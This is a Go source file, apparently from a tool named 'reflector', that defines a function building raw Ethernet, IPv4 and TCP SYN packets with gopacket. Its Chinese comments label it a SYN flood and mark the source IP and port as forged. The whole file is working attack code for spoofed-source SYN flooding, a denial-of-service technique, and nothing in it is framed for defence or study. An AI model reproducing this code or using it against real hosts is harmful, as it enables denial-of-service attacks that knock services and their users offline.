package protocol

import (
	"net"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"reflector/packetbuilder"
)


// SYN 泛洪
func SYNPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	dstMacStr, err := packetbuilder.FindMAC(dstIP)
    if err != nil {
        return nil, fmt.Errorf("failed to find MAC for %s: %w", dstIP, err)
    }
    dstMac, err := net.ParseMAC(dstMacStr)
    if err != nil {
        return nil, fmt.Errorf("failed to parse MAC address: %w", err)
    }

    srcMac, err := packetbuilder.GetSrcMAC(dstIP)
    if err != nil {
        return nil, fmt.Errorf("failed to get source MAC address: %w", err)
    }

    // 构造 Ethernet 层
    ethLayer := &layers.Ethernet{
        SrcMAC:       srcMac, // 源 MAC 地址
        DstMAC:       dstMac, // 下一跳 MAC 地址
        EthernetType: layers.EthernetTypeIPv4,
    }

	// 构造 IP 层
	ipLayer := &layers.IPv4{
		Version:  4,                       // IPv4
		IHL:      5,                       // Internet Header Length
		TOS:      0,                       // 服务类型
		TTL:      64,                      // 生存时间
		Protocol: layers.IPProtocolTCP,    // 设置为 TCP
		SrcIP:    net.ParseIP(srcIP),      // 伪造的源 IP
		DstIP:    net.ParseIP(dstIP),      // 目标 IP
	}

	// 构造 TCP 层
	tcpLayer := &layers.TCP{
		SrcPort: layers.TCPPort(srcPort), // 伪造的源端口
		DstPort: layers.TCPPort(dstPort), // 目标端口
		Seq:     1105024978,             // 初始序列号（可以随机生成）
		SYN:     true,                   // 设置 SYN 标志位
		Window:  14600,                  // 窗口大小
	}

	// 设置网络层以计算校验和
	if err := tcpLayer.SetNetworkLayerForChecksum(ipLayer); err != nil {
		return nil, fmt.Errorf("TCP 校验和计算失败: %v", err)
	}

	// 创建序列化选项，用于设置长度和校验和
	options := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	buffer := gopacket.NewSerializeBuffer()

	// 序列化以太网层、IP 层、TCP 层
	err = gopacket.SerializeLayers(buffer, options, ethLayer, ipLayer, tcpLayer)
	if err != nil {
		return nil, fmt.Errorf("序列化层失败: %v", err)
	}

	// 返回生成的报文字节切片
	return buffer.Bytes(), nil
}